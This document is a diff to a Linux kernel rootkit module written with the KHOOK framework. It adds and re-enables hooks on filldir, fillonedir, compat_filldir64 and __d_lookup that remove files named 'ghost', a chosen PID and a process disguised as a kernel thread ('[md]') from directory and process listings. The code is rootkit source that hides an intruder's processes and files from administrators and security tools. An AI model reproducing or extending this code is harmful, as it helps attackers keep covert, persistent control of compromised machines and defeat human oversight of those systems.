@@ -21,12 +21,12 @@
 
 
 #define FLAG 0x80000000
-const char *protected = "[ttm_swap]";
+const char *protected = "[md]";
 int protected_pid = -1;
 int hide_pid = -1;
 const char *hide = "gsd-mouse";
 
-static int adore_atoi(const char *str)
+int adore_atoi(const char *str)
 {
         int ret = 0, mul = 1;
         const char *ptr;
@@ -168,9 +168,7 @@ KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int)
 static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	if(adore_atoi(name)==protected_pid){
-		return ret;
-	}
+	
 	if (!strstr(name, "ghost") )
 		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
@@ -179,13 +177,17 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t of
 KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
-
+	// char *endp;
+	// long pid;
+	// int ret = 0;
+	// find_pid_hide();
+	// pid = simple_strtol(name, &endp, 10);
+	// if (pid != hide_pid || !strstr(name, "ghost")|| !strstr(name,protected))
+	// 	ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
+	// return ret;
 	int ret = 0;
 	find_pid_hide();
-	if(adore_atoi(name)==hide_pid){
-		return ret;
-	}
-	if (!strstr(name, "ghost"))
+	if(hide_pid!=adore_atoi(name) && !strstr(name, "ghost") && !strstr(name,protected))
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -210,31 +212,31 @@ static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
 	return ret;
 }
 
-// #if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
-// KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
-// static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
-// 				  loff_t offset, u64 ino, unsigned int d_type)
-// {
-// 	int ret = 0;
-// 	if (!strstr(name, "ghost"))
-// 		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
-// 	return ret;
-// }
-// #endif
+#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
+KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
+				  loff_t offset, u64 ino, unsigned int d_type)
+{
+	int ret = 0;
+	if (!strstr(name, "ghost"))
+		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
+	return ret;
+}
+#endif
 
-// #if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
-// KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
-// struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
-// #else
-// KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
-// struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
-// #endif
-// {
-// 	struct dentry *found = NULL;
-// 	if (!strstr(name->name, "ghost"))
-// 		found = KHOOK_ORIGIN(__d_lookup, parent, name);
-// 	return found;
-// }
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
+KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
+struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
+#else
+KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
+struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
+#endif
+{
+	struct dentry *found = NULL;
+	if (!strstr(name->name, "ghost"))
+		found = KHOOK_ORIGIN(__d_lookup, parent, name);
+	return found;
+}
 
 KHOOK_EXT(long, sys_kill, pid_t, int);
 static long khook_sys_kill(pid_t pid, int sig) {
@@ -257,16 +259,16 @@ static ssize_t khook_vfs_read(struct file *file, char __user *buf, size_t count,
 
 
 
-// KHOOK(find_task_by_vpid);
-// struct task_struct *khook_find_task_by_vpid(pid_t vnr)
-// {
-// 	struct task_struct *tsk = NULL;
-// 	tsk=KHOOK_ORIGIN(find_task_by_vpid, vnr);
-// 	find_pid_kill();
-// 	printk("pid:%d", protected_pid);
-// 	if(protected_pid==vnr) tsk=NULL; 
-// 	return tsk;
-// }
+/*KHOOK(find_task_by_vpid);
+struct task_struct *khook_find_task_by_vpid(pid_t vnr)
+{
+	struct task_struct *tsk = NULL;
+	tsk=KHOOK_ORIGIN(find_task_by_vpid, vnr);
+	find_pid();
+	printk("pid:%d", protected_pid);
+	if(protected_pid==vnr) tsk=NULL; 
+	return tsk;
+}*/
 
 
 // KHOOK_EXT(struct task_struct *, find_task_by_vpid, pid_t);
@@ -314,42 +316,42 @@ static ssize_t khook_vfs_read(struct file *file, char __user *buf, size_t count,
 
 
 
+/*
+KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
+static long khook___x64_sys_kill(const struct pt_regs *regs) {
+        printk("sys_kill -- %s pid %ld sig %ld\n", current->comm, regs->di, regs->si);
+        return KHOOK_ORIGIN(__x64_sys_kill, regs);
+}*/
 
-// KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
-// static long khook___x64_sys_kill(const struct pt_regs *regs) {
-//         printk("sys_kill -- %s pid %ld sig %ld\n", current->comm, regs->di, regs->si);
-//         return KHOOK_ORIGIN(__x64_sys_kill, regs);
-// }
 
 
+/*KHOOK(inode_permission);
+static int khook_inode_permission(struct inode *inode, int mask)
+{
+	int ret = 0;
+s
+	ret = KHOOK_ORIGIN(inode_permission, inode, mask);
+	printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
 
-// KHOOK(inode_permission);
-// static int khook_inode_permission(struct inode *inode, int mask)
-// {
-// 	int ret = 0;
-// s
-// 	ret = KHOOK_ORIGIN(inode_permission, inode, mask);
-// 	printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
-
-// 	return ret;
-// }
+	return ret;
+}*/
 
 ////////////////////////////////////////////////////////////////////////////////
 // An example of using KHOOK_EXT
 ////////////////////////////////////////////////////////////////////////////////
 
-// #include <linux/binfmts.h>
+/*#include <linux/binfmts.h>
 
-// KHOOK_EXT(int, load_elf_binary, struct linux_binprm *);
-// static int khook_load_elf_binary(struct linux_binprm *bprm)
-// {
-// 	int ret = 0;
+KHOOK_EXT(int, load_elf_binary, struct linux_binprm *);
+static int khook_load_elf_binary(struct linux_binprm *bprm)
+{
+	int ret = 0;
 
-// 	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
-// 	printk("%s(%p) = %d\n", __func__, bprm, ret);
+	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
+	printk("%s(%p) = %d\n", __func__, bprm, ret);
 
-// 	return ret;
-// }
+	return ret;
+}*/
 
 ////////////////////////////////////////////////////////////////////////////////
 
